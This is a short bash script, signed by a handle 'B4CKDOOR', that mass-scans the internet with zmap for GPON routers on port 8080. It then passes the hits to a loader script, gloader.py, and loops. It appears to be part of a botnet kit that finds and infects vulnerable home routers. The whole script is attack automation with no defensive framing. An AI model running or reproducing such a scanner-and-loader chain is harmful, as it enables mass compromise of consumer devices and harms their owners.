#!/bin/bash
#!MAKE BY B4CKDOOR
clear
echo -e "\e[1;32mNow Auto-Scanning GPON"
zmap -p8080 -wg.lst -og.txt
ulimit -n 999999
python gloader.py g.txt
clear
sh gpon.sh
